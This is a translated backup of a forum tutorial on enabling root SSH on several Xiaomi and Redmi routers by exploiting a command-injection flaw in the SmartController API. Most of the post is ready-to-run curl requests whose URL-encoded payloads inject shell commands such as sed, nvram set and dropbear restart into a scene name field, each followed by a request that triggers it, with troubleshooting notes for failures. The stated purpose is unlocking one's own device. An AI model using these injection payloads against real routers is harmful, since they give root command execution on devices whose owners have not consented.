# Back up version of forum page
### Original link: https://www.right.com.cn/forum/thread-8348455-1-1.html

### Author: `Minorice`

# ———— Introduction ————
I pondered it two days ago Xiaomi AX3000 on SSH When I saw the big guy developing XMIR-Patcher script, at the time I was curious about how it was implemented, and then I looked through the source code as wellA few related CVEsIt was found that the firmware of several Xiaomi routers can be injected at an API called SmartController, and there are as many as 2 ways to inject it. After carefully analyzing the specific vulnerabilities, we have researched a set of methods to open the theoretical AX3000/AIoT AX3600/AX9000/10 Gigabit router/AC2100/AIoT AC2350/AX1800/AX5400 E-sports Edition/Redmi AX3000 several models of SSH by using curl, and sent it to the forum to share it with you.

# ———— Preparation ————
### Any of the routers in the above list  
### An electronic device that can use the curl command  
### Router environment requirements: 
- Xiaomi 10 Gigabit Router: MiWiFi ROM Stable Version `1.0.53`  
- Xiaomi Router AC2100: MiWiFi ROM Stable Version `2.0.743`  
- Xiaomi Router AX1800: MiWiFi ROM Stable Version `1.0.399`  
- Xiaomi Router AX3000: MiWiFi ROM Stable Version `1.0.48` / `1.0.46`  
- Xiaomi AIoT IoT Router AX3600: MiWiFi ROM Stable Version `1.1.21`  
- Xiaomi Router AX9000: MiWiFi ROM Stable Version `1.0.165 ` 
- Xiaomi AIoT IoT Router AC2350: MiWiFi ROM Stable Version `1.3.8`  
- Redmi Router AX5400 Esports Edition: MiWiFi ROM Stable Edition `1.0.95`  
- Redmi Router AX3000: MiWiFi ROM Stable Version `1.0.33`    

### Device environment requirements:  
Can be connected to a router  
Windows OS devices: Any terminal software (cmd / Windows Terminal / Git Bash / ...)  

### [!] If the router is newer than the recommended version, it is recommended to perform a downgrade, otherwise there is no guarantee that the injection will be successful.

### How to get the historical firmware of Xiaomi router:
visit https://api.miwifi.com/upgrade/log/list?typeList=`<QueryID>`, it will `<QueryID>` be replaced with your router device code + the ROM version you want to get, for example, if I want to get the stable ROM history of the Xiaomi AX3000, I should access it https://api.miwifi.com/upgrade/log/list?typeList=RA80STA The output is in JSON format, which can be viewed using F12 - Network or copied to an editor such as VSCode for formatting.
### (?) How do I get my router hardware codename?  
Please visit: http://www1.miwifi.com/miwifi_download.html, find your router ROM and click Download to see the download file name.   
For example, the firmware name of the Xiaomi 10 Gigabit router is `miwifi_rc01_firmware_d6c13_1.1.16.bin`, the router has a hardware code name of `RC01` and a `QueryID` of `RC01STA` (stable).  
Here are some of the historical firmware download links for the routers mentioned above.

# —— Text ——
Everything is ready to stop, and we're ready to go.  
First, please turn on your router and connect it to your device.  
Please confirm the IP address of your router and log in to the router background to get the stok value.  
### (?) Don't know how to get the STOK value? Please search the forums for relevant tutorials.  
In the following, parts are referenced in this way:  
### `<HOST>` : The IP address of your router
### `<TOKEN>` : The stok value you get

Let's get started.

### Step 1: Activate the Mi Home Smart Controller function
The SmartController feature is disabled by default in most scenarios, and we need to activate it by resetting the router system time.
Open your terminal software and enter the following command:

> curl -X GET "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/misystem/set_sys_time?time=2023-2-19%2023:4:47&timezone=CST-8"

## [!] Note: This will reset your router's system time to 2023-02-19 23:04:47 and the timezone is GMT +8, Please recall the system time after the injection is completed。
Now that we've activated the SmartController feature, we're ready to start injecting.

### [!] Note: For Windows users, Please do not execute within PowerShell。 PowerShell's built-in curl command format is different from the one used in this article. Please use cmd (conhost) / git bash / wsl.

### (?) Troubleshooting: Can't find the curl command?
Visit: https://www.google.com/search?q=Can%27t+find+the+curl+command&ie=UTF-8

# Step 2: Use the SED to unlock the dropbear configuration
Now, we can inject a vulnerability to execute arbitrary commands as root on the router without any restrictions. Let's use sed to replace all release fields in /etc/init.d/dropbear with XXXXXX.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(sed%20-i%20s%2Frelease%2FXXXXXX%2Fg%20%2Fetc%2Finit.d%2Fdropbear)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A1%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"

The return after executing this command should look something like this:  

`{ "code": 0, "msg": "", "id":30022 }`

### (?) Troubleshooting
If it returns as `{"code": 3, "msg": "parameter error"}`: Please check that the command has been copied in its entirety. This issue can occur if there are one or more double quotes/single quotes in the request, or if the payload is not formatted correctly.  

If it returns as `Internal Server Error`: Please check the router operating status. If there is no abnormality in the running status, it may be:  

Injection detection has been added to this ROM version, this vulnerability cannot be exploited directly, and downgrading is recommended.  
The request is malformed, perhaps because the request contains a special character or an exception escape symbol that is not allowed.  

If it returns as `{"code": -100, "msg": "connect failed!"}`: Failed to connect to the Xiaomi Smart Scene Controller service smartcontroller.service. It is recommended to try restarting the router or doing a factory reset.  

If you have other short command injection ingress, try running Service SmartController Restart on your router  

Your router may not have cleared the crash partition, please check if you can connect via either telnet / SSH, if you can, go to `The third sub-item of step sevento` exit factory mode. If you can't connect, then you may be stuck in an endless loop, try to restore the device using a brick rescue tool. If it still doesn't work, please send it for after-sales repair.  

If it returns as `{"code": 3001, "msg": "invalid token"}`: The value of `STOK` tokens has expired, please log in to the Web Admin again to get it

_______________

Note that after executing this command, we just saved a Smart Scene task, but did not trigger its execution. Again, request to manually execute this scheduled task, so that the injection can be completed.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A1%22%2C%22week%22%3A0%7D"

Once the URL is requested, the task will be executed and the injected command will be run.  
The return after the request should look something like this: 

`{ "code": 0, "msg": "" }`

### (?) Troubleshooting
If it returns as `{"code": -100, "msg": "connect failed!"}`: Failed to connect to the Xiaomi Smart Scene Controller service smartcontroller.service. It is recommended to try restarting the router or doing a factory reset.  

See Troubleshooting in the previous step.  

If it returns as `{"code": 3004, "msg": "request server timed out"}`: The smartcontroller service is unresponsive while performing a task. This can be due to an incorrect SmartTask.sc record. It is recommended to restore the router to factory settings.  

If it returns as `Internal Server Error`: Please check the router operating status.  

Yes, we've done the first step, unlock Dropbear, and move on.

# Step 3: Use NVRAM to activate ssh_en CI

Let's then request, submit the nvram set ssh_en=1 command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(nvram%20set%20ssh_en%3D1)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A2%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"

Execute the command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A2%22%2C%22week%22%3A0%7D"

Then, commit the NVRAM modifications.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(nvram%20commit)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A3%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"

Execute the command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A3%22%2C%22week%22%3A0%7D"

Good. At this time, we look at http://`<HOST>`/cgi-bin/luci/; stok=`<TOKEN>`/api/xqsystem/fac_info, "ssh" should have become true. It's almost time to start the dropbear service!

### (?) Troubleshooting
SSH config item doesn't change to true?  
Please confirm that you have done the first step correctly. Activating the SmartController feature is necessary.  
If that doesn't work, then the vulnerability may not apply to your router or router ROM version. Try replacing the old firmware or replacing the router.  


# Step 4: Launch the dropbear service
Submit the dropbear enable command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(%2Fetc%2Finit.d%2Fdropbear%20enable)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A4%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"

Execute the command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A4%22%2C%22week%22%3A0%7D"

Submit the dropbear restart command to restart the dropbear service.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_setting%22%2C%22name%22%3A%22'%24(%2Fetc%2Finit.d%2Fdropbear%20restart)'%22%2C%22action_list%22%3A%5B%7B%22thirdParty%22%3A%22xmrouter%22%2C%22delay%22%3A17%2C%22type%22%3A%22wan_block%22%2C%22payload%22%3A%7B%22command%22%3A%22wan_block%22%2C%22mac%22%3A%2200%3A00%3A00%3A00%3A00%3A00%22%7D%7D%5D%2C%22launch%22%3A%7B%22timer%22%3A%7B%22time%22%3A%223%3A5%22%2C%22repeat%22%3A%220%22%2C%22enabled%22%3Atrue%7D%7D%7D"

Execute the command.

> curl -X POST "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/xqsmarthome/request_smartcontroller" -d "payload=%7B%22command%22%3A%22scene_start_by_crontab%22%2C%22time%22%3A%223%3A5%22%2C%22week%22%3A0%7D"

# Step 5: Connect to SSH
Everything is done, exciting times.  
Open your favorite SSH software, ssh `root@<HOST>`, and if you are able to establish a connection, then the injection is successful!  

The default password can be found in the [MiWiFi.DEV SSH Passwd Calculator Calculate](https://miwifi.dev/ssh) , enter your S/N serial number to get the default password, use the default password to connect.  

### (?) Troubleshooting
Can't connect to SSH?  
Please check and confirm that the IP address is correct
Try restarting your router one more time  

If it still doesn't work, please confirm firstWhether the SSH in step 3 has become true。 If yes, try using vulnerability injection  sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear command  

(Note: This injection can be difficult and involves escaping with multiple quotes.)

If there is still no response, see the Troubleshooting section at the end of this article.  

Note: This exception has been successfully reproduced on AIoT AC2100, if you encounter such a problem, please refer to this post first Turn on Telnet on the 25th floor, and try to use Telnet connection, if it still doesn't work, it may be that the current ROM version has added some limitations. Downgrading is recommended. For AC2100 users, please refer to it Here solution.


# Step 6: Reset the router time
Go to the router's web background or use the API `(only if the router is routed as a mesh sub-route)` to reset the time.

> curl -X GET "http://`<HOST>`/cgi-bin/luci/; stok=`<TOKEN>`/api/misystem/set_sys_time?time=<年>-<月><日>-%20<时>:<分>:<秒>&timezone=<时区>"

For example, if I want to reset the time to February 20, 2024 10:40:30 seconds, then the request should be expressed as

> curl -X GET "http://`<HOST>`/cgi-bin/luci/;stok=`<TOKEN>`/api/misystem/set_sys_time?time=2024-2-20%2010:40:30&timezone=CST-8"

[?] If you don't have the target server used as a subroute, you can reset the time directly through the Web Admin without having to reset it through the API.  
[√] You can also reset the time via SSH, usage:

> leijun@XiaoQiang:~ # date <时间戳>-s

### [!] After the first ~ fifth steps are completed, please be sure to perform this step, otherwise the router may not be able to use the networking function correctly (SSL time verification failed error). For example, the system update function cannot be used normally.


# Step 7: Hard curing

### [!] If you don't have this requirement, you can skip it.
### [!] This method has only been tested on the Xiaomi AX3000 router, other models have not been tested. Please do so at your own risk.

## Check the original post of the original author for details.


# —— Postscript ——

There's nothing else to say, I don't know what Xiaomi has been doing with this vulnerability, `AX3000` can still use this vulnerability in the latest firmware.

# —— Troubleshooting ——

If you have not successfully activated SSH via this method, then check for the following issues during the operation:  

Whether it has been rigorouslyAccording to the order in the tutorialExecute the command? Some commands may look more or less the same, but there are subtle differences. For example, several commands that execute a scheduled task, request the same API and data structure, but the execution time of the request is different. If all of these commands directly use the content copied from the first time, the effect is that the sed command is executed several times, and none of the other commands are executed.  

Have you manually activated the SmartController feature? On some devices, if updating the time via API does not work, please try to manually reset the device time on the web management page. (Any time possible)  

Are there smart scene tasks that overlap in time? The times of the Smart Scene commands in this tutorial are 3:1, 3:2, 3:3, 3:4, and 3:5, respectively. If you have used SmartController-related features before and created Smart Tasks during these periods, it is recommended to delete Smart Tasks or perform a factory reset.  

Whether the router ROM version matches? In some newer versions of ROM, this issue may have been fixed. The submission of the CVE drew Xiaomi's attention to the entire SmartController API logic, and if it fails, please downgrade to the ROM version suggested above and try again. If it still doesn't work, please reply below the post and provide your return after the curl command, router information, etc.